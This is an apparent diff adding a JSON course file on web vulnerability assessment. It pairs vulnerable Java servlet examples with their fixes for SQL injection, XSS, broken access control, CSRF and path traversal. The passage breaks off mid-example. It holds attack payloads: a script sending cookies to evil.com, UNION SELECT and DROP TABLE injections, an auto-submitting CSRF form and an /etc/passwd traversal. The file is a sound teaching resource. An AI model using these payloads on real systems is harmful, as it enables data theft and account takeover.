@@ -1,0 +1,1600 @@
+{
+  "course_id": "web_vuln_assessment",
+  "title": "Web Application Vulnerability Assessment",
+  "description": "Learn to identify, exploit, and fix real web application vulnerabilities using OWASP Top 10 methodology — the core skill of every security professional.",
+  "difficulty": "INTERMEDIATE",
+  "estimated_hours": 10,
+  "prerequisites": [
+    "Basic Java knowledge",
+    "Understanding of web requests (HTTP GET/POST)",
+    "Familiarity with HTML forms"
+  ],
+  "learning_outcomes": [
+    "Identify common web application vulnerabilities by exploring application behaviour",
+    "Classify vulnerabilities using OWASP Top 10 and CWE identifiers",
+    "Demonstrate exploitation of SQL Injection, XSS, Broken Access Control, CSRF, and Path Traversal",
+    "Assess the CIA (Confidentiality, Integrity, Availability) impact of each vulnerability",
+    "Write corrected code that mitigates each vulnerability type",
+    "Apply the OWASP Risk Rating Methodology to prioritise security findings",
+    "Produce a structured vulnerability assessment report with evidence",
+    "Understand the difference between normal application behaviour and exploited behaviour"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-5 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging ethical hacker mentor. Uses real-world breach stories to motivate. Never judges mistakes — treats every wrong answer as a learning opportunity. Celebrates when learners spot vulnerabilities. Reminds learners they're building skills that protect real people.",
+    "intervention_triggers": {
+      "idle_40_seconds": "Hey there! Vulnerability hunting takes patience — even professional pentesters stare at screens for a while. Want me to give you a nudge about where to look? 🔍",
+      "idle_90_seconds": "Still thinking? That's totally fine! Security assessment is like detective work — you're looking for clues. Would you like me to explain the concept differently, maybe with a real-world analogy? I can break it down step by step.",
+      "idle_180_seconds": "I know this can feel overwhelming — there's a lot to take in. Let's simplify: focus on just ONE thing. What does the application do with user input? That single question unlocks most web vulnerabilities. Want me to walk through it together?",
+      "first_error": "Not quite — but that's exactly how security professionals learn! Every wrong attempt teaches you something about how the application works. Let me give you a hint about what to look at next.",
+      "repeated_errors": "I can see you're working hard on this — that persistence is exactly what makes a great security analyst. Let me try explaining this from a completely different angle. Think of it like this...",
+      "after_success": "Brilliant work! 🎉 You just found a real vulnerability — the same kind that has caused major data breaches at real companies. That's a genuine security skill. Ready for the next challenge?"
+    },
+    "encouragement_phrases": [
+      "You're thinking like a real penetration tester! 🔓",
+      "Great catch! That's exactly the kind of detail that matters in security.",
+      "Even experienced hackers miss things — you spotted it! Well done.",
+      "Security is a journey, not a destination. Every exercise makes you stronger. 💪",
+      "That vulnerability you found? It's in the OWASP Top 10 for a reason — it's everywhere in the real world.",
+      "Don't worry about being perfect. Professional security audits are iterative — you check, re-check, and check again.",
+      "You're building skills that literally protect people's data and privacy. That matters.",
+      "Mistakes are data points, not failures. Each one tells you something about the system.",
+      "The fact that you're practicing this puts you ahead of most developers who never think about security.",
+      "Nice work! Let's keep that momentum going! 🚀"
+    ],
+    "explanation_styles": {
+      "analogy": "Web vulnerabilities are like unlocked doors in a building. SQL injection is like a master key — one clever input opens everything. XSS is like leaving a note that every future visitor reads. Broken access control is like a VIP room with no bouncer.",
+      "visual": "Follow the data flow: User Input → [BROWSER] → HTTP Request → [SERVER] → Database Query → [DATABASE] → Response → [BROWSER]. Vulnerabilities happen when any step TRUSTS the input without checking it.",
+      "step_by_step": "Step 1: Identify where the app takes user input. Step 2: Think about what the app does with that input. Step 3: Ask 'What if I send something unexpected?' Step 4: Try it. Step 5: Observe what happens. Step 6: Classify what you found.",
+      "code_trace": "Let's trace the code line by line. The user types into the search box. The servlet reads it with getParameter('q'). Then it puts that DIRECTLY into a SQL string with + concatenation. No PreparedStatement, no escaping. That's the vulnerability — right there on that line.",
+      "comparison": "VULNERABLE: String sql = \"SELECT * FROM users WHERE name = '\" + input + \"'\"; vs SAFE: PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE name = ?\"); ps.setString(1, input); — Same result, completely different security posture."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "web_vuln_assessment_lesson_1",
+      "title": "Web Application Vulnerability Assessment: From Discovery to Fix",
+      "theory": {
+        "introduction": "Imagine you're a security guard at a massive shopping centre. Your job isn't just to stand at the door — it's to walk every corridor, check every lock, test every fire exit, and find every way a thief could get in BEFORE a real thief does. That's exactly what web application vulnerability assessment is: systematically testing a web application to find security weaknesses before attackers exploit them.\n\nEvery major data breach you've heard about — the ones that exposed millions of people's credit cards, passwords, medical records — started with a vulnerability that someone didn't find in time. In 2023, the MOVEit breach affected over 60 million people because of a single SQL injection vulnerability. In 2024, a path traversal flaw in a popular file transfer tool exposed government agencies. These aren't exotic, rare bugs — they're the same vulnerability types you'll learn to find in this module.\n\nThe OWASP Top 10 is the global standard that categorises the most critical web application security risks. Think of it as the 'Most Wanted' list for web vulnerabilities. Security professionals worldwide use it to prioritise what to look for. In this module, you'll learn to identify, exploit, and fix the vulnerabilities that appear on this list — using a deliberately vulnerable e-commerce application as your training ground.\n\nThis isn't just theory. You'll write real exploit payloads, see real impacts, and write real fixes. By the end, you'll be able to assess any web application's security posture — a skill that's in massive demand across the entire technology industry.",
+        "why_important": "Web application vulnerabilities are the #1 cause of data breaches worldwide. The average cost of a data breach in 2024 was $4.88 million (IBM Security). Over 90% of web applications contain at least one vulnerability from the OWASP Top 10. Yet most developers never receive formal training in finding or fixing these issues. Learning vulnerability assessment doesn't just make you a better developer — it makes you the person on the team who can prevent the next headline-making breach. Companies actively seek professionals with these skills, and cybersecurity roles are among the fastest-growing and highest-paid in technology. Whether you want to become a penetration tester, a security engineer, or simply a developer who writes secure code, this module builds the foundation you need.",
+        "key_concepts": [
+          {
+            "concept": "SQL Injection (SQLi) — CWE-89",
+            "explanation": "SQL Injection happens when an application builds database queries by sticking user input directly into a SQL string. It's like giving someone a fill-in-the-blank form, but they write outside the blanks and add their own instructions. Instead of typing a product name like 'headphones', an attacker types something like: ' OR '1'='1 — which changes the SQL logic to return EVERYTHING from the database. This is one of the oldest and most devastating web vulnerabilities, responsible for breaches at Sony, TalkTalk, and Heartland Payment Systems. The fix is simple: use PreparedStatements with parameterised queries, which treat user input as DATA, never as SQL commands.",
+            "example": "// VULNERABLE CODE — Direct string concatenation\nString query = \"SELECT * FROM products WHERE name LIKE '%\" + userInput + \"%'\";\nStatement stmt = conn.createStatement();\nResultSet rs = stmt.executeQuery(query);\n// If userInput = \"' OR '1'='1\"  the query becomes:\n// SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'\n// This returns ALL products including hidden ones!\n\n// FIXED CODE — Parameterised query\nString query = \"SELECT * FROM products WHERE name LIKE ?\";\nPreparedStatement pstmt = conn.prepareStatement(query);\npstmt.setString(1, \"%\" + userInput + \"%\");\nResultSet rs = pstmt.executeQuery();\n// Now the input is ALWAYS treated as data, never as SQL",
+            "ai_hint": "Think of SQL injection like a restaurant order pad. The waiter writes your order in the blank space. But what if you write 'cancel all orders' in that space? A parameterised query is like a pad where you can ONLY write food names — anything else is ignored."
+          },
+          {
+            "concept": "Cross-Site Scripting (XSS) — CWE-79",
+            "explanation": "XSS happens when an application displays user-provided content without sanitising it, allowing an attacker to inject HTML or JavaScript that runs in OTHER users' browsers. Imagine a product review section: you write a review, but instead of text, you insert <script>alert('hacked')</script>. Every person who views that product page now runs YOUR script. Stored XSS (the type we focus on) is especially dangerous because the malicious payload is saved in the database and shown to every future visitor. A real attacker wouldn't just show an alert — they'd steal session cookies, redirect users to phishing sites, or modify the page content. The fix is output encoding: convert special characters like < > to their HTML entity equivalents (&lt; &gt;) before rendering.",
+            "example": "// VULNERABLE — Review content rendered without encoding\nString reviewContent = rs.getString(\"content\");\nout.printf(\"<p>%s</p>\", reviewContent);\n// If content = <script>document.location='http://evil.com/?c='+document.cookie</script>\n// This script RUNS in every visitor's browser, stealing their cookies!\n\n// FIXED — HTML encode before output\nString safe = reviewContent\n    .replace(\"&\", \"&amp;\")\n    .replace(\"<\", \"&lt;\")\n    .replace(\">\", \"&gt;\")\n    .replace(\"\\\"\", \"&quot;\");\nout.printf(\"<p>%s</p>\", safe);\n// Now <script> displays as visible text, not executable code",
+            "ai_hint": "XSS is like someone leaving a booby-trapped note in a library book. You open the book expecting to read, but the note makes your phone call a number automatically. Output encoding is like laminating the pages — you can SEE the note but it can't DO anything."
+          },
+          {
+            "concept": "Broken Access Control — CWE-284",
+            "explanation": "Broken Access Control means the application checks whether you're logged in but doesn't check WHETHER YOU'RE ALLOWED to do what you're trying to do. It's the #1 vulnerability in the OWASP Top 10 (2021 and 2025). Imagine an online shop where any logged-in customer can access the admin dashboard just by typing /admin in the URL. The server sees 'yes, this person is authenticated' but never checks 'is this person an admin?' This is called vertical privilege escalation. There's also horizontal access control — where user A can see user B's private data by changing an ID in the URL. The fix requires server-side role checks on EVERY protected endpoint, not just checking if someone is logged in.",
+            "example": "// VULNERABLE — Only checks authentication, not authorisation\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    if (session == null || session.getAttribute(\"userId\") == null) {\n        resp.sendRedirect(\"/login\");\n        return;\n    }\n    // MISSING: Role check! Any logged-in user reaches admin page\n    renderAdminDashboard(out);\n}\n\n// FIXED — Checks both authentication AND authorisation\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    if (session == null || session.getAttribute(\"userId\") == null) {\n        resp.sendRedirect(\"/login\");\n        return;\n    }\n    String role = (String) session.getAttribute(\"role\");\n    if (!\"admin\".equals(role)) {\n        resp.sendError(403, \"Access Denied\");\n        return;\n    }\n    renderAdminDashboard(out);\n}",
+            "ai_hint": "It's like a nightclub that checks your ID at the door (authentication) but doesn't check your VIP wristband before letting you into the VIP lounge (authorisation). Two different checks, both essential."
+          },
+          {
+            "concept": "Cross-Site Request Forgery (CSRF) — CWE-352",
+            "explanation": "CSRF tricks a logged-in user's browser into making a request they didn't intend. Here's the scenario: you're logged into your online shop. You visit a different website (maybe clicking a link in an email). That website has a hidden form that automatically submits to YOUR shop, changing your email address or shipping address. Your browser dutifully sends your session cookie with the request — the shop thinks it's you making the change. The attacker never sees your password; they just ride on your existing session. The fix is CSRF tokens: a random, unpredictable value generated per session and included in every form. The server checks the token before processing — since the attacker can't guess the token, their forged request gets rejected.",
+            "example": "// VULNERABLE — No CSRF protection\n// Attacker creates this HTML on evil.com:\n// <body onload=\"document.forms[0].submit()\">\n// <form action=\"http://shop.com/profile/edit\" method=\"POST\">\n//   <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n// </form>\n// If victim visits evil.com while logged into shop.com,\n// their email silently changes!\n\n// FIXED — Generate and verify CSRF token\n// In the form (server-side):\nString token = UUID.randomUUID().toString();\nsession.setAttribute(\"csrfToken\", token);\nout.printf(\"<input type='hidden' name='csrf' value='%s'>\", token);\n\n// On form submission (server-side):\nString submitted = req.getParameter(\"csrf\");\nString expected = (String) session.getAttribute(\"csrfToken\");\nif (expected == null || !expected.equals(submitted)) {\n    resp.sendError(403, \"CSRF token invalid\");\n    return;\n}",
+            "ai_hint": "CSRF is like someone forging a signed cheque. They don't steal your pen — they trick you into signing a blank page, then write the amount themselves. A CSRF token is like writing the amount FIRST in permanent ink before you sign."
+          },
+          {
+            "concept": "Path Traversal — CWE-22",
+            "explanation": "Path Traversal happens when a web application uses user-supplied input to access files on the server without properly validating the path. The attacker uses ../ sequences to 'climb up' out of the intended directory and access any file the server can read. If a download URL looks like /download?file=invoice.pdf, an attacker changes it to /download?file=../../../etc/passwd and suddenly reads system files. This can expose configuration files with database passwords, SSH keys, application source code, and sensitive user data. The fix requires canonicalising the path and verifying it stays within the allowed directory.",
+            "example": "// VULNERABLE — No path validation\nString filename = req.getParameter(\"file\");\nFile file = new File(\"web/invoices/\" + filename);\n// If filename = ../../../etc/passwd\n// Resolves to: web/invoices/../../../etc/passwd = /etc/passwd\n\n// FIXED — Validate path stays within allowed directory\nString filename = req.getParameter(\"file\");\nPath basePath = Paths.get(\"web/invoices\").toAbsolutePath().normalize();\nPath resolved = basePath.resolve(filename).normalize();\nif (!resolved.startsWith(basePath)) {\n    resp.sendError(403, \"Access denied — invalid path\");\n    return;\n}\n// Only reaches here if file is genuinely inside web/invoices/",
+            "ai_hint": "Path traversal is like someone asking a librarian for 'the book on shelf 3' but saying 'shelf 3, then go through the Staff Only door, then open the safe.' The librarian should check that all requests stay within the public shelves."
+          },
+          {
+            "concept": "Information Exposure via Error Messages — CWE-209",
+            "explanation": "When an application crashes, it often shows a detailed error page with stack traces, class names, database schemas, file paths, and server configuration. Developers love this information for debugging — but attackers love it even more. A stack trace reveals the exact technology stack (Java version, server type, database engine), internal class structure (package names, method names), and sometimes even SQL queries with table and column names. This is like leaving the building's blueprints taped to the front door. The fix: show users a generic 'Something went wrong' page and log detailed errors server-side only.",
+            "example": "// VULNERABLE — Exposes stack trace to user\ntry {\n    // some database operation\n} catch (SQLException e) {\n    out.printf(\"<pre>%s</pre>\", e.getMessage());\n    e.printStackTrace(out);  // Full stack trace visible!\n}\n// Shows: java.sql.SQLException: no such table: users\n// at DatabaseHelper.searchProducts(DatabaseHelper.java:142)\n// Attacker now knows: table name, class name, line number\n\n// FIXED — Generic message to user, details to server log\ntry {\n    // some database operation\n} catch (SQLException e) {\n    logger.error(\"Database error in search\", e);  // Server log only\n    out.print(\"<p>Something went wrong. Please try again.</p>\");\n    out.print(\"<p>Error reference: ERR-\" + System.currentTimeMillis() + \"</p>\");\n}",
+            "ai_hint": "Detailed error pages are like a burglar finding a map of your house with every window and alarm marked. A generic error page is like just showing a 'No Trespassing' sign — it tells them nothing useful."
+          },
+          {
+            "concept": "The CIA Triad — Impact Assessment",
+            "explanation": "Every vulnerability assessment must evaluate impact using the CIA triad: Confidentiality (can an attacker READ data they shouldn't?), Integrity (can they CHANGE data they shouldn't?), and Availability (can they PREVENT legitimate users from accessing the system?). SQL injection typically affects all three. XSS primarily affects Integrity (injecting content) and Confidentiality (stealing cookies/data). Broken Access Control is mainly a Confidentiality issue. CSRF affects Integrity (modifying data without consent). Understanding CIA impact is crucial for prioritising which vulnerabilities to fix first — a vulnerability that affects all three is more critical than one affecting only one.",
+            "example": "// Example: Assessing CIA impact of SQL Injection in a search bar\n//\n// Confidentiality: HIGH\n//   - Attacker can read ALL database records\n//   - Including hidden products, user details, order data\n//   - Input: ' UNION SELECT username, password, email FROM users--\n//\n// Integrity: HIGH  \n//   - With advanced payloads, attacker can modify data\n//   - Input: '; UPDATE products SET price = 0.01 WHERE id = 1;--\n//\n// Availability: MEDIUM\n//   - Could drop tables or cause performance issues\n//   - Input: '; DROP TABLE products;--\n//\n// Overall severity: CRITICAL",
+            "ai_hint": "Think of CIA like protecting a physical safe. Confidentiality = nobody can SEE inside. Integrity = nobody can CHANGE what's inside. Availability = the owner can always OPEN it when they need to."
+          },
+          {
+            "concept": "OWASP Top 10 — The Classification System",
+            "explanation": "The OWASP Top 10 is a standard awareness document for web application security. It represents a broad consensus about the most critical security risks to web applications. The 2025 edition includes: A01:Broken Access Control, A02:Cryptographic Failures, A03:Injection (SQL, command, etc.), A04:Insecure Design, A05:Security Misconfiguration, A06:Vulnerable Components, A07:Authentication Failures, A08:Data Integrity Failures, A09:Logging & Monitoring Failures, A10:Server-Side Request Forgery. When you find a vulnerability, classifying it by OWASP category helps communicate its severity using a language that every security professional understands.",
+            "example": "// Mapping vulnerabilities to OWASP Top 10:2025\n//\n// SQL Injection         → A03: Injection\n// Stored XSS            → A03: Injection\n// Broken Access Control  → A01: Broken Access Control\n// CSRF                  → A01: Broken Access Control (subcategory)\n// Path Traversal        → A01: Broken Access Control\n// Info Exposure         → A05: Security Misconfiguration\n// Plaintext Passwords   → A02: Cryptographic Failures\n//\n// In a report, write:\n// \"Vulnerability: SQL Injection (CWE-89)\n//  OWASP Category: A03:2025 - Injection\n//  Severity: Critical\n//  Location: Product search endpoint (/shop/search)\"",
+            "ai_hint": "OWASP Top 10 is like a doctor's diagnostic manual. When you find a symptom (vulnerability), you look it up in the manual to give it a proper name and severity level. This way, every security professional speaks the same language."
+          },
+          {
+            "concept": "Normal vs Exploited Behaviour",
+            "explanation": "A crucial part of vulnerability assessment is understanding the DIFFERENCE between how an application SHOULD behave and how it DOES behave when exploited. A web application with a vulnerability still works correctly for normal users most of the time — that's what makes vulnerabilities hard to spot. For example, a search bar normally returns matching products. Under SQL injection, it returns ALL products including hidden ones. The 'normal' behaviour is correct results; the 'exploited' behaviour is unintended data exposure. When demonstrating a vulnerability, ALWAYS show both: 'here's what it does normally' and 'here's what happens when I send this specific input.' This is how you prove it's a security vulnerability and not just a software bug.",
+            "example": "// NORMAL BEHAVIOUR:\n// User searches: \"headphones\"\n// Result: 1 product — Wireless Headphones (£79.99)\n// ✅ Correct! Only matching public products shown.\n\n// EXPLOITED BEHAVIOUR:\n// User searches: ' OR '1'='1\n// Result: 20 products including:\n//   - All 18 public products\n//   - \"INTERNAL: Staff Discount Products\" (HIDDEN)\n//   - \"INTERNAL: Unreleased Prototype X\" (HIDDEN)\n// ❌ VULNERABILITY! Hidden records exposed to any user.\n\n// The difference between these two results IS the vulnerability.\n// Screenshot both for your assessment report.",
+            "ai_hint": "It's like testing a door. Normal: you turn the handle, it opens for people with keys. Exploited: you jiggle it a certain way and it opens for ANYONE. The door works 'fine' for key holders — the exploit is only visible when you try something unexpected."
+          },
+          {
+            "concept": "Vulnerability Report Writing",
+            "explanation": "Finding a vulnerability is only half the job. The other half is communicating it clearly so developers can fix it. A professional vulnerability report includes: 1) Title (vulnerability name + location), 2) CWE identifier and OWASP category, 3) Severity rating (Critical/High/Medium/Low), 4) Description (what the vulnerability is and where it exists), 5) Steps to reproduce (exact inputs and actions), 6) Evidence (screenshots of normal vs exploited behaviour), 7) Impact (CIA assessment), 8) Recommended fix (specific code-level mitigation). A report that says 'there's a security problem' is useless. A report that says 'SQL injection in /search endpoint, exploitable with this input, impacts confidentiality, fix with PreparedStatement' — that gets fixed immediately.",
+            "example": "// Professional Vulnerability Report Template:\n//\n// TITLE: SQL Injection in Product Search\n// CWE: CWE-89 | OWASP: A03:2025 Injection\n// SEVERITY: Critical\n//\n// DESCRIPTION:\n// The product search endpoint (/shop/search) constructs SQL\n// queries using string concatenation with unsanitised user input.\n//\n// STEPS TO REPRODUCE:\n// 1. Navigate to http://localhost:16000/shop/search\n// 2. Enter: ' OR '1'='1\n// 3. Observe: All products including hidden ones are returned\n//\n// IMPACT: Confidentiality HIGH | Integrity HIGH | Availability MEDIUM\n//\n// FIX: Replace Statement with PreparedStatement in\n// DatabaseHelper.searchProducts() method.",
+            "ai_hint": "A vulnerability report is like a doctor's note. 'You're ill' is not helpful. 'You have strep throat, here's the test result, take this antibiotic for 7 days' — now you know exactly what's wrong and how to fix it."
+          },
+          {
+            "concept": "Severity Rating — OWASP Risk Rating Methodology",
+            "explanation": "Not all vulnerabilities are equal. A SQL injection that exposes millions of records is more critical than an information disclosure that reveals the server version. The OWASP Risk Rating Methodology calculates risk as: Risk = Likelihood × Impact. Likelihood considers: how easy is it to discover? How easy to exploit? How widespread is it? Impact considers: how much data is exposed? Can it be modified? What's the business damage? A Critical vulnerability is easy to find, easy to exploit, and causes major damage (like SQL injection in a login form). A Low vulnerability is hard to find, requires special conditions, and has minimal impact (like exposing a server header).",
+            "example": "// Severity Rating Examples:\n//\n// CRITICAL (fix immediately):\n//   SQL Injection in search — easy to find, easy to exploit,\n//   exposes entire database. CVSS: 9.8\n//\n// HIGH (fix within 24 hours):\n//   Broken Access Control — requires login but then trivial\n//   to access admin pages. Exposes all user PII. CVSS: 8.1\n//\n// MEDIUM (fix within 1 week):\n//   Stored XSS — requires social engineering to get victims\n//   to view the page. Can steal sessions. CVSS: 6.5\n//\n// LOW (fix in next release):\n//   Info Exposure via error page — reveals server version\n//   but doesn't directly enable exploitation. CVSS: 3.7",
+            "ai_hint": "Think of severity like a weather warning. Critical = tornado touching down (evacuate NOW). High = severe thunderstorm (seek shelter). Medium = heavy rain (bring an umbrella). Low = overcast (you'll be fine, but be aware)."
+          },
+          {
+            "concept": "Input Validation vs Output Encoding vs Parameterisation",
+            "explanation": "Three different defence techniques are often confused. Input Validation checks that data COMING IN matches expected patterns (e.g., an age field only accepts numbers). Output Encoding transforms data GOING OUT so special characters are rendered harmlessly (e.g., < becomes &lt; in HTML). Parameterisation separates CODE from DATA in database queries (PreparedStatements). Each defence protects against different attack types: validation reduces attack surface, encoding prevents XSS, parameterisation prevents SQLi. The mistake is thinking ONE technique covers everything. Defence in depth means using ALL of them at their appropriate points in the data flow.",
+            "example": "// INPUT VALIDATION — Check data at entry point\nString age = req.getParameter(\"age\");\nif (!age.matches(\"\\\\d{1,3}\")) {\n    resp.sendError(400, \"Age must be a number\");\n    return;\n}\n\n// OUTPUT ENCODING — Sanitise data at display point\nString name = rs.getString(\"name\");\nString safeName = name.replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\");\nout.printf(\"<p>%s</p>\", safeName);\n\n// PARAMETERISATION — Separate code from data in queries\nPreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\nps.setInt(1, userId);\n\n// Use ALL THREE for defence in depth!",
+            "ai_hint": "Think of a post office. Input validation is the size limit (package must fit in the slot). Output encoding is the scanner that deactivates anything dangerous inside. Parameterisation is the labelling system that ensures packages go to the right destination, never to the control room."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: Normal vs SQL Injection — Search Bar",
+          "description": "Demonstrates how a product search behaves normally vs under SQL injection attack",
+          "difficulty": "beginner",
+          "code": "// SearchServlet.java — VULNERABLE VERSION\nimport javax.servlet.http.*;\nimport java.io.*;\nimport java.sql.*;\n\npublic class SearchServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        String query = req.getParameter(\"q\");\n        Connection conn = DatabaseHelper.getConnection();\n\n        // VULNERABLE: Direct string concatenation\n        String sql = \"SELECT * FROM products WHERE hidden = 0 AND \"\n            + \"(name LIKE '%\" + query + \"%')\";\n        Statement stmt = conn.createStatement();\n        ResultSet rs = stmt.executeQuery(sql);\n\n        // Display results...\n        while (rs.next()) {\n            out.printf(\"Product: %s — £%.2f\\n\",\n                rs.getString(\"name\"), rs.getDouble(\"price\"));\n        }\n    }\n}",
+          "output": "NORMAL: Search 'headphones'\n→ Product: Wireless Headphones — £79.99\n(1 result — correct!)\n\nEXPLOITED: Search  ' OR '1'='1\n→ Product: Wireless Headphones — £79.99\n→ Product: USB-C Hub — £34.99\n→ Product: Mechanical Keyboard — £89.99\n→ ... (18 more products)\n→ Product: INTERNAL: Staff Discount Products — £0.01  ⚠ HIDDEN\n→ Product: INTERNAL: Unreleased Prototype X — £999.99  ⚠ HIDDEN\n(20 results — hidden products exposed!)",
+          "ai_explanation": "Line by line:\n1. The servlet reads the user's search query from the URL parameter 'q'\n2. It builds a SQL string by directly inserting the user's input with + concatenation\n3. Normal input 'headphones' creates: WHERE name LIKE '%headphones%' — correct!\n4. Malicious input ' OR '1'='1 creates: WHERE name LIKE '%' OR '1'='1%'\n5. The OR '1'='1' part is ALWAYS true, so every row matches\n6. The hidden=0 check is bypassed because OR changes the query logic\n7. Result: ALL products returned including hidden internal ones",
+          "ai_challenge": "Try modifying the SQL injection to use UNION SELECT to read data from a different table (like users). What would the payload look like?"
+        },
+        {
+          "title": "Example 2: Stored XSS — Injecting Script via Review",
+          "description": "Shows how a product review can contain JavaScript that executes in every visitor's browser",
+          "difficulty": "beginner",
+          "code": "// ReviewServlet.java — Stores review WITHOUT sanitisation\npublic class ReviewServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n        String content = req.getParameter(\"content\");\n        int productId = Integer.parseInt(req.getParameter(\"product_id\"));\n        int userId = (int) session.getAttribute(\"userId\");\n\n        // VULNERABLE: content stored as-is, no sanitisation\n        PreparedStatement ps = conn.prepareStatement(\n            \"INSERT INTO reviews (product_id, user_id, content) VALUES (?,?,?)\");\n        ps.setInt(1, productId);\n        ps.setInt(2, userId);\n        ps.setString(3, content);  // HTML/JS stored directly!\n        ps.executeUpdate();\n    }\n}\n\n// ProductServlet.java — Renders review WITHOUT encoding\nResultSet reviews = getReviewsForProduct(conn, productId);\nwhile (reviews.next()) {\n    String content = reviews.getString(\"content\");\n    out.printf(\"<div class='review'><p>%s</p></div>\", content);\n    // content is rendered as raw HTML — scripts will execute!\n}",
+          "output": "NORMAL REVIEW: \"Great headphones, excellent sound quality!\"\n→ Displays: Great headphones, excellent sound quality!\n\nMALICIOUS REVIEW: <script>alert('XSS — your cookies: '+document.cookie)</script>\n→ Displays: [NOTHING visible — but an alert box pops up showing cookies]\n→ Every user who views this product page sees the alert\n→ A real attacker would steal cookies silently, not show an alert",
+          "ai_explanation": "The vulnerability has TWO parts:\n1. STORAGE: ReviewServlet saves user content directly to database with no filtering\n2. DISPLAY: ProductServlet renders it with printf — browser interprets HTML/JS\n\nThe attack chain:\na) Attacker posts review containing <script>...</script>\nb) Database stores the script as plain text (database doesn't care what it is)\nc) Another user views the product page\nd) Server reads review from DB, puts it in HTML response\ne) Browser receives HTML with embedded <script> tag\nf) Browser executes the script — attacker's code runs in victim's browser\n\nThis is 'stored' XSS because the payload persists in the database.",
+          "ai_challenge": "Instead of alert(), write a payload that would redirect the victim to a fake login page to steal their password. How would output encoding prevent this?"
+        },
+        {
+          "title": "Example 3: Broken Access Control — Customer Accessing Admin",
+          "description": "Demonstrates how a normal customer can access admin-only pages by simply changing the URL",
+          "difficulty": "beginner",
+          "code": "// AdminServlet.java — VULNERABLE VERSION\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        HttpSession session = req.getSession(false);\n\n        // Checks IF logged in...\n        if (session == null || session.getAttribute(\"userId\") == null) {\n            resp.sendRedirect(\"/shop/login\");\n            return;\n        }\n        // ...but NEVER checks the role!\n        // MISSING: if (!\"admin\".equals(session.getAttribute(\"role\"))) {\n        //              resp.sendError(403); return; }\n\n        // Any logged-in user reaches this code:\n        renderUserList(out);  // Shows ALL users with emails, phones, addresses\n    }\n\n    private void renderUserList(PrintWriter out) {\n        ResultSet rs = DatabaseHelper.getAllUsers(conn);\n        while (rs.next()) {\n            out.printf(\"User: %s | Email: %s | Phone: %s | Address: %s\\n\",\n                rs.getString(\"full_name\"), rs.getString(\"email\"),\n                rs.getString(\"phone\"), rs.getString(\"address\"));\n        }\n    }\n}",
+          "output": "NORMAL (as admin): Navigate to /shop/admin/users\n→ User: Shop Administrator | Email: admin@shopsecure.local | ...\n→ User: Alice Johnson | Email: alice@example.com | Phone: 555-0101 | ...\n→ User: Bob Smith | Email: bob@example.com | Phone: 555-0102 | ...\n→ (all 6 users visible — correct for admin)\n\nEXPLOITED (as customer1): Type /shop/admin/users in address bar\n→ SAME OUTPUT! Customer sees all user data including PII\n→ No error, no redirect, no access denied\n→ The server only checked 'are you logged in?' not 'are you admin?'",
+          "ai_explanation": "The code has a clear logic gap:\nLine 5-8: Checks if session exists and userId is set → 'Is this person logged in?'\nLine 9-10: Comment shows MISSING role check → 'Is this person an ADMIN?'\nLine 12: Goes straight to rendering sensitive data\n\nAuthentication ≠ Authorisation:\n- Authentication: 'Who are you?' → Session proves identity ✓\n- Authorisation: 'What are you allowed to do?' → Role check MISSING ✗\n\nAny customer who knows or guesses the /admin/users URL can access it.\nThe 'Admin Dashboard' link only shows in the nav for admins, but that's\njust UI hiding — the actual server endpoint has no protection.",
+          "ai_challenge": "Fix this servlet by adding proper role checking. Where exactly should the check go? What HTTP status code should be returned for unauthorised access?"
+        },
+        {
+          "title": "Example 4: CSRF Attack — Silently Changing User Profile",
+          "description": "Shows how a malicious webpage can modify a logged-in user's profile without their knowledge",
+          "difficulty": "intermediate",
+          "code": "// ProfileServlet.java — VULNERABLE (no CSRF token)\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    HttpSession session = req.getSession(false);\n    int userId = (int) session.getAttribute(\"userId\");\n\n    // Accepts ANY POST request — no CSRF verification\n    String email = req.getParameter(\"email\");\n    String fullName = req.getParameter(\"full_name\");\n    DatabaseHelper.updateProfile(conn, userId, email, fullName, addr, phone);\n}\n\n// ATTACKER'S WEBPAGE (evil.html):\n// <html>\n// <body onload=\"document.forms[0].submit()\">\n//   <form action=\"http://localhost:16000/shop/profile/edit\" method=\"POST\">\n//     <input type=\"hidden\" name=\"email\" value=\"hacker@evil.com\">\n//     <input type=\"hidden\" name=\"full_name\" value=\"Account Compromised\">\n//     <input type=\"hidden\" name=\"address\" value=\"Hacker Street\">\n//     <input type=\"hidden\" name=\"phone\" value=\"000-0000\">\n//   </form>\n// </body></html>",
+          "output": "BEFORE ATTACK:\n  Name: Alice Johnson | Email: alice@example.com\n\nAttack sequence:\n1. Alice is logged into ShopSecure in Tab 1\n2. Alice clicks a link that opens evil.html in Tab 2\n3. evil.html auto-submits a form to ShopSecure\n4. Browser includes Alice's session cookie automatically\n5. ShopSecure sees a valid session → processes the update\n\nAFTER ATTACK:\n  Name: Account Compromised | Email: hacker@evil.com\n  Alice's profile has been silently changed!",
